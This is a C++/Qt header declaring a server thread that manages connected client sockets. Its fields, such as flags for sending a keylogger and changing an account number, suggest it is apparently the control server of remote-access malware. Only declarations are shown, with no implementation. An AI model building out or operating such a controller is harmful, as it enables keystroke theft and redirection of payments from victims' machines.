#ifndef SERVERTHREAD_H
#define SERVERTHREAD_H

#include <winsock2.h>
#include <QThread>
#include <QString>
#include "serverandclient.h"

class serverThread: public QThread
{
    Q_OBJECT

public:
    explicit serverThread(QObject *parent = 0, bool stopThread = false, bool stopOnlyClients = false);
    ~serverThread();
    void run();
    bool Stop;
    bool stopOnlyClients;
    std::string needToSendAgain;
    std::string newCommand;
    bool needToChangeAccountNumber;
    bool needToSendKeylogger;
    bool oldNeedToSendKeylogger;
    bool oldNeedToChangeAccountNumber;
    std::string accountNumberToChange;
    std::vector<SOCKET> clientSockets;
    std::vector<serverAndClient*> clientServerThreads;
private:
    std::string convertToString(char* a, int size);
signals:
    // To communicate with Gui Thread
    // we need to emit a signal
    void changeCountOfClients(int);
    void changeProgressBarValue(int);
    void appendConsoleLog(std::string,std::string);

    void lastCommandChangeValue(std::string);
    std::string lastCommandGetValue();
public slots:
    void onChangeCountOfClientsOnServer(int);
    void onAppendConsoleLogClientServer(std::string,std::string);
    void onCloseClientSocket(int clientId);
    void onSendMessageToClient(int clientId, char* text);
    void onRecieveBufferMessageFromClient(int clientId);

    void onLastCommandChangeValue(std::string);
    std::string onLastCommandGetValue();
};

#endif // SERVERTHREAD_H
